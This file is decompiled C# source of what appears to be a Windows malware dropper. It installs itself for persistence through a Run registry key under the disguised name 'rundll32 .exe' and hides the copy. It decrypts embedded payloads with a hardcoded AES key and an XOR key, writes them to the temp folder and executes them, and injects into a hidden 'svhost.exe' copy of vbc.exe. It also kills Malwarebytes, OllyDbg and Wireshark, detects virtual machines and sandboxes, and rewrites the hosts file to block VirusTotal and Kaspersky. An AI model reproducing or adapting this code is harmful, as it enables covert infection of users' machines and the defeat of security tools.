using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
internal sealed class pizde
{
	private static string iohouh7877 = "GDGDF54545";

	private static string HostEditing = "%28%";

	private static string antis = "%29%";

	private static string stuff = "%something%";

	private static object Devices;

	private static string Grafikadapter;

	private static string RegionA = "SELECT * FROM Win32_VideoController";

	[STAThread]
	public static void Main()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string temp = default(string);
		string processName = default(string);
		object tempPath = default(object);
		object executablePath = default(object);
		object fullPath = default(object);
		FileAttributes fileAttributes = default(FileAttributes);
		string s = default(string);
		string text = default(string);
		string s2 = default(string);
		string text2 = default(string);
		byte[] array = default(byte[]);
		string s3 = default(string);
		byte[] dAS4DA = default(byte[]);
		string s4 = default(string);
		string text3 = default(string);
		byte[] array2 = default(byte[]);
		object tempPath2 = default(object);
		string vVVVVVCAE = default(string);
		string sourceFileName = default(string);
		string text4 = default(string);
		FileAttributes fileAttributes2 = default(FileAttributes);
		string temp2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1219:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0022;
						case 5:
							goto IL_003b;
						case 6:
							goto IL_0045;
						case 7:
							goto IL_004f;
						case 8:
							goto IL_0060;
						case 9:
							goto IL_0066;
						case 10:
							goto IL_009a;
						case 11:
							goto IL_00c5;
						case 12:
						case 13:
							goto IL_00eb;
						case 14:
							goto IL_0102;
						case 16:
							goto IL_010d;
						case 15:
						case 17:
						case 18:
							goto IL_0111;
						case 19:
							goto IL_011a;
						case 20:
							goto IL_0123;
						case 21:
							goto IL_012c;
						case 22:
							goto IL_0136;
						case 23:
							goto IL_0140;
						case 24:
							goto IL_014a;
						case 25:
							goto IL_0154;
						case 26:
							goto IL_015c;
						case 27:
							goto IL_016d;
						case 28:
							goto IL_0174;
						case 29:
							goto IL_0186;
						case 30:
							goto IL_0191;
						case 31:
							goto IL_01a8;
						case 32:
							goto IL_01b0;
						case 33:
							goto IL_01c2;
						case 34:
							goto IL_01d8;
						case 35:
							goto IL_01e3;
						case 36:
							goto IL_01fe;
						case 37:
							goto IL_0233;
						case 38:
							goto IL_023d;
						case 39:
							goto IL_0272;
						case 40:
							goto IL_027f;
						case 41:
						case 42:
							goto IL_028b;
						case 43:
							goto IL_0291;
						case 44:
							goto IL_02ca;
						case 45:
							goto IL_02da;
						case 46:
						case 47:
							goto IL_02e7;
						case 48:
							goto IL_02f7;
						case 49:
							goto IL_0307;
						case 50:
							goto IL_0321;
						case 51:
							goto IL_0343;
						case 52:
						case 53:
						case 54:
							goto IL_0359;
						case 55:
							goto IL_0369;
						case 56:
							goto IL_0383;
						case 57:
							goto IL_03a5;
						case 58:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 59:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_03a5:
					num = 57;
					Process.Start(temp + "\\%tmp%.exe");
					break;
					IL_0008:
					num = 2;
					processName = Process.GetCurrentProcess().ProcessName;
					goto IL_0017;
					IL_0017:
					num = 3;
					Process.GetProcessesByName(processName);
					goto IL_0022;
					IL_0022:
					num = 4;
					if (Operators.CompareString(iohouh7877, "hhhhhhhhhheeeee", false) == 0)
					{
						goto IL_003b;
					}
					goto IL_00eb;
					IL_003b:
					num = 5;
					tempPath = Path.GetTempPath();
					goto IL_0045;
					IL_0045:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_004f;
					IL_004f:
					num = 7;
					fullPath = Path.GetFullPath(Conversions.ToString(executablePath));
					goto IL_0060;
					IL_0060:
					num = 8;
					fileAttributes = FileAttributes.Hidden | FileAttributes.System;
					goto IL_0066;
					IL_0066:
					num = 9;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("rundll32", Operators.ConcatenateObject(tempPath, (object)"rundll32 .exe"));
					goto IL_009a;
					IL_009a:
					num = 10;
					FileSystem.FileCopy(Conversions.ToString(fullPath), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath, (object)"\\"), (object)"rundll32 .exe")));
					goto IL_00c5;
					IL_00c5:
					num = 11;
					File.SetAttributes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath, (object)"\\"), (object)"rundll32 .exe")), fileAttributes);
					goto IL_00eb;
					IL_00eb:
					num = 13;
					if (Operators.CompareString(HostEditing, "hhhhhhhhhheeeee", false) == 0)
					{
						goto IL_0102;
					}
					goto IL_010d;
					IL_0102:
					num = 14;
					HostEdit();
					goto IL_0111;
					IL_010d:
					num = 16;
					goto IL_0111;
					IL_0111:
					num = 18;
					AntiMalwarebytes();
					goto IL_011a;
					IL_011a:
					num = 19;
					AntiOllydbg();
					goto IL_0123;
					IL_0123:
					num = 20;
					AntiWireshark();
					goto IL_012c;
					IL_012c:
					num = 21;
					AntiVirtualBox();
					goto IL_0136;
					IL_0136:
					num = 22;
					AntiVirtualPC();
					goto IL_0140;
					IL_0140:
					num = 23;
					AntiVmWare();
					goto IL_014a;
					IL_014a:
					num = 24;
					IsDebuggerPresent();
					goto IL_0154;
					IL_0154:
					num = 25;
					s = text;
					goto IL_015c;
					IL_015c:
					num = 26;
					okitokjwe33(Convert.FromBase64String(s));
					goto IL_016d;
					IL_016d:
					num = 27;
					s2 = text2;
					goto IL_0174;
					IL_0174:
					num = 28;
					array = okitokjwe33(Convert.FromBase64String(s2));
					goto IL_0186;
					IL_0186:
					num = 29;
					s3 = "w5GIlIaYjZGYmpGXiZWIkZGOw6XavbGLlpKUhZmWjZuUvKe1nKWrx4OM362My8XOq8rf3Jybi4uLkpyLhZyElpibjpyd3N+QqtaflLORtoiaw76WpLCLyrfIi6SBtMeYhJvfuomYw5GIlIaYjZGYmpGXiZWIkZGOw87ew8DN3NKClZeLiZyChZmchpiGlZKcn9KokpyOidKClZeLiZyChZmchpiGlZKcn9K6gYWYw5GIlIaYjZGYmpGXiZWIkZGOw7uPn4OYw5GIlIaYjZGYmpGXiZWIkZGOw7uPn4OYw5GIlIaYjZGYmpGXiZWIkZGOw7uPn4OYw5GIlIaYjZGYmpGXiZWIkZGOw7uPmJXdiY+cnILSgJuJhZWcgIuHkpqYhJuMkoPSuJWHgNCUn92LgYKSnt2DloOOjZqL3Jybi4uLkpyLhZyElpibjpyd3LSSm5OCnJGZzLGHnZvdpJiclt7TwtKClZeLiZyChZmchpiGlZKcn9KokpyOidKClZeLiZyChZmchpiGlZKcn9KokpyOidKClZeLiZyChZmchpiGlZKcn9Ls";
					goto IL_0191;
					IL_0191:
					num = 30;
					dAS4DA = decrypt(Convert.FromBase64String(s3), "parola");
					goto IL_01a8;
					IL_01a8:
					num = 31;
					s4 = text3;
					goto IL_01b0;
					IL_01b0:
					num = 32;
					array2 = okitokjwe33(Convert.FromBase64String(s4));
					goto IL_01c2;
					IL_01c2:
					num = 33;
					Encoding.GetEncoding(1252).GetBytes(s);
					goto IL_01d8;
					IL_01d8:
					num = 34;
					tempPath2 = Path.GetTempPath();
					goto IL_01e3;
					IL_01e3:
					num = 35;
					Directory.CreateDirectory(Conversions.ToString(Operators.ConcatenateObject(tempPath2, (object)"winamp")));
					goto IL_01fe;
					IL_01fe:
					num = 36;
					vVVVVVCAE = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath2, (object)"\\"), (object)"winamp"), (object)"\\"), (object)"svhost.exe"));
					goto IL_0233;
					IL_0233:
					num = 37;
					sourceFileName = "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe";
					goto IL_023d;
					IL_023d:
					num = 38;
					text4 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath2, (object)"\\"), (object)"winamp"), (object)"\\"), (object)"svhost.exe"));
					goto IL_0272;
					IL_0272:
					num = 39;
					if (!File.Exists(text4))
					{
						goto IL_027f;
					}
					goto IL_028b;
					IL_027f:
					num = 40;
					File.Copy(sourceFileName, text4);
					goto IL_028b;
					IL_028b:
					num = 42;
					fileAttributes2 = FileAttributes.Hidden | FileAttributes.System;
					goto IL_0291;
					IL_0291:
					num = 43;
					File.SetAttributes(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(tempPath2, (object)"\\"), (object)"winamp"), (object)"\\"), (object)"svhost.exe")), fileAttributes2);
					goto IL_02ca;
					IL_02ca:
					num = 44;
					if (!IsProcessRunning4("sandboxierpcss.exe"))
					{
						goto IL_02da;
					}
					goto IL_02e7;
					IL_02da:
					num = 45;
					buffy.mickey(dAS4DA, vVVVVVCAE);
					goto IL_02e7;
					IL_02e7:
					num = 47;
					if (!IsProcessRunning2("%temp%.exe"))
					{
						goto IL_02f7;
					}
					goto IL_0359;
					IL_02f7:
					num = 48;
					if (!IsProcessRunning5("something.exe"))
					{
						goto IL_0307;
					}
					goto IL_0359;
					IL_0307:
					num = 49;
					temp2 = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0321;
					IL_0321:
					num = 50;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(temp2 + "\\%temp%.exe", array2, false);
					goto IL_0343;
					IL_0343:
					num = 51;
					Process.Start(temp2 + "\\%temp%.exe");
					goto IL_0359;
					IL_0359:
					num = 54;
					if (IsProcessRunning3("%tmp%.exe"))
					{
						break;
					}
					goto IL_0369;
					IL_0369:
					num = 55;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0383;
					IL_0383:
					num = 56;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(temp + "\\%tmp%.exe", array, false);
					goto IL_03a5;
					end_IL_0000_2:
					break;
				}
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1219;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int IsDebuggerPresent();

	public static void Main2()
	{
		if (IsDebuggerPresent() == 1)
		{
			Console.WriteLine("Debugger Is Present");
		}
		else
		{
			Console.WriteLine("Debugger Not Present");
		}
	}

	private static void HostEdit()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath + "\\drivers\\etc\\\\hosts";
		StreamWriter streamWriter = new StreamWriter(path);
		streamWriter.Write("127.0.0.1 www.virustotal.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virustotal.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 novirusthanks.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 vscan.novirusthanks.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virusscan.jotti.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.virusscan.jotti.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virscan.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.virscan.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 virus-trap.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.virus-trap.org");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 filterbit.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.filterbit.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 viruschief.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.viruschief.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 kaspersky.com");
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write("127.0.0.1 www.kaspersky.com");
		streamWriter.Dispose();
	}

	public static bool AntiVirtualBox()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VirtualBox Graphics Adapter", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool AntiVmWare()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VMware SVGA II", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static bool AntiVirtualPC()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		bool flag = default(bool);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					getDevices();
					string grafikadapter = Grafikadapter;
					flag = ((Operators.CompareString(grafikadapter, "VM Additions S3 Trio32/64", false) == 0) ? true : false);
					goto end_IL_0000;
				}
				case 48:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_0066;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 48;
				continue;
			}
			break;
			IL_0066:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		bool result = flag;
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private static void getDevices()
	{
		int try0000_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
				{
					ProjectData.ClearProjectError();
					num2 = 2;
					object @object = Interaction.GetObject("winmgmts:", (string)null);
					object[] array = new object[1] { RegionA };
					bool[] array2 = new bool[1] { true };
					object obj = NewLateBinding.LateGet(@object, (Type)null, "ExecQuery", array, (string[])null, (Type[])null, array2);
					if (array2[0])
					{
						RegionA = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
					}
					Devices = RuntimeHelpers.GetObjectValue(obj);
					IEnumerator enumerator = ((IEnumerable)Devices).GetEnumerator();
					while (enumerator.MoveNext())
					{
						object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
						Grafikadapter = Conversions.ToString(NewLateBinding.LateGet(objectValue, (Type)null, "Description", new object[0], (string[])null, (Type[])null, (bool[])null));
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000;
				}
				case 212:
					num = -1;
					switch (num2)
					{
					case 2:
						ProjectData.EndApp();
						goto end_IL_0000;
					}
					break;
				}
				goto IL_010e;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num2 != 0 && num == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 212;
				continue;
			}
			break;
			IL_010e:
			throw ProjectData.CreateProjectError(-2146828237);
		}
		if (num != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void AntiMalwarebytes()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "mbam", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiOllydbg()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "ollydbg", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	public static void AntiWireshark()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				string text = Strings.LCase(processes[i].ProcessName);
				if (Operators.CompareString(text, "wireshark", false) == 0)
				{
					processes[i].Kill();
				}
			}
		}
	}

	private static bool IsProcessRunning2(string name)
	{
		Process[] processesByName = Process.GetProcessesByName("%temp%");
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	private static bool IsProcessRunning3(string name)
	{
		Process[] processesByName = Process.GetProcessesByName("%tmp%");
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	private static bool IsProcessRunning4(string name)
	{
		Process[] processesByName = Process.GetProcessesByName("sandboxierpcss");
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	private static bool IsProcessRunning5(string name)
	{
		Process[] processesByName = Process.GetProcessesByName("something");
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	public static byte[] okitokjwe33(byte[] data)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.IV = new byte[16]
		{
			1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
			2, 3, 4, 5, 6, 7
		};
		rijndaelManaged.Key = new byte[16]
		{
			7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
			6, 5, 4, 3, 2, 1
		};
		return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
	}

	public static byte[] decrypt(byte[] message, string password)
	{
		byte[] bytes = Encoding.Default.GetBytes(password);
		checked
		{
			int num = message[message.Length - 1] ^ 0x70;
			byte[] array = new byte[message.Length + 1];
			int num2 = message.Length - 1;
			int num3 = default(int);
			for (int i = 0; i <= num2; i++)
			{
				array[i] = (byte)(message[i] ^ num ^ bytes[num3]);
				num3 = ((num3 != password.Length - 1) ? (num3 + 1) : 0);
			}
			return (byte[])Utils.CopyArray((Array)array, (Array)new byte[message.Length - 2 + 1]);
		}
	}
}
